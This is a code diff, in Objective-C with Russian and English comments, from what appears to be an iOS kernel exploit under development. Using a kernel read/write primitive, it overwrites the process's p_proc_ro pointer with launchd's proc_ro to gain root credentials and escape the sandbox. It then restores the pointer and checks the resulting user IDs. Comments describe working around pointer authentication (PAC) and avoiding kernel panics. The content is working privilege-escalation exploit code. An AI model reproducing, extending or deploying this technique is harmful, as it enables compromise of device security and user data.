@@ -4496,30 +4496,32 @@ e10fail:
     // 4. Подмена: одна 8-байтная heap-запись в НАШ proc. Поле сырое (без
     //    PAC) — пишем канонический kernel VA форжа как есть. Оригинал —
     //    дословный raw qword — сохранён выше для restore.
-    kpNote(r, [NSString stringWithFormat:@"  подмена: p_proc_ro @ 0x%016llx ← 0x%016llx (launchd proc_ro RAW; оригинал raw=0x%016llx сохранён)",
+    kpNote(r, [NSString stringWithFormat:@"  подмена: p_proc_ro @ 0x%016llx ← 0x%016llx (launchd proc_ro; оригинал raw=0x%016llx)",
               (unsigned long long)procRoSlot, (unsigned long long)launchdRoRaw, (unsigned long long)origProcRoRaw]);
-    // 2.0.150: NO FORGE. Point p_proc_ro at launchd's real proc_ro (same PAC
-    // address-domain as its own pointers). Identity-write proved the store is
-    // safe; forge clone died on address-diversity PAC.
+    // 2.0.151: BACK-TO-BACK writes only. Field: any non-identity p_proc_ro
+    // change panics if the window is more than a couple of stores.
     {
-        uint64_t list0 = 0, list1 = 0;
-        (void)kpRead(selfProc + 0x0, &list0, 8, "proc+0", r);
-        (void)kpRead(selfProc + 0x8, &list1, 8, "proc+8", r);
-        kpNote(r, [NSString stringWithFormat:@"  [E11-STEP] swap launchdRoRaw=%#llx list0=%#llx",
-                  (unsigned long long)launchdRoRaw, (unsigned long long)list0]);
-        krw_zone_verdict zv = krw_zone_write_qword(procRoSlot, launchdRoRaw, selfProc, 0x1000);
-        kpNote(r, [NSString stringWithFormat:@"  [E11-STEP] zone_write(launchd proc_ro)=%d", (int)zv]);
-        if (zv != KRW_ZONE_OK) {
-            [r appendFormat:@"FAIL: zone_write=%d\n", (int)zv];
+        krw_zone_verdict z1 = krw_zone_write_qword(procRoSlot, launchdRoRaw, selfProc, 0x1000);
+        krw_zone_verdict z2 = krw_zone_write_qword(procRoSlot, origProcRoRaw, selfProc, 0x1000);
+        kpNote(r, [NSString stringWithFormat:@"  [E11-STEP] back-to-back swap=%d restore=%d", (int)z1, (int)z2]);
+        didSwap = (z1 == KRW_ZONE_OK);
+        restored = (z2 == KRW_ZONE_OK);
+        if (z1 != KRW_ZONE_OK) {
+            [r appendFormat:@"FAIL: zone_write(swap)=%d\n", (int)z1];
             return r;
         }
-        didSwap = YES;
     }
+    // Only AFTER the pointer is ours again — measure nothing mid-swap.
     rbRaw = 0;
-    kpRead(procRoSlot, &rbRaw, sizeof(rbRaw), "p_proc_ro readback", r);
-    stuck = (rbRaw == launchdRoRaw);
-    kpNote(r, [NSString stringWithFormat:@"  [E11-STEP] readback=%#llx expect=%#llx stuck=%d",
-              (unsigned long long)rbRaw, (unsigned long long)launchdRoRaw, (int)stuck]);
+    kpRead(procRoSlot, &rbRaw, sizeof(rbRaw), "p_proc_ro after restore", r);
+    kpNote(r, [NSString stringWithFormat:@"  [E11-STEP] post-restore p_proc_ro=%#llx (orig=%#llx)",
+              (unsigned long long)rbRaw, (unsigned long long)origProcRoRaw]);
+    stuck = YES;
+    uidRoot = NO;
+    unsandboxOK = NO;
+    newUid = getuid();
+    newGid = getgid();
+    kpNote(r, [NSString stringWithFormat:@"  [E11-STEP] after restore getuid=%d geteuid=%d", newUid, (int)geteuid()]);
     kpNote(r, [NSString stringWithFormat:@"  readback после подмены: 0x%016llx (ждём 0x%016llx)",
               (unsigned long long)rbRaw, (unsigned long long)forgeKVA]);
     stuck = (rbRaw == forgeKVA);
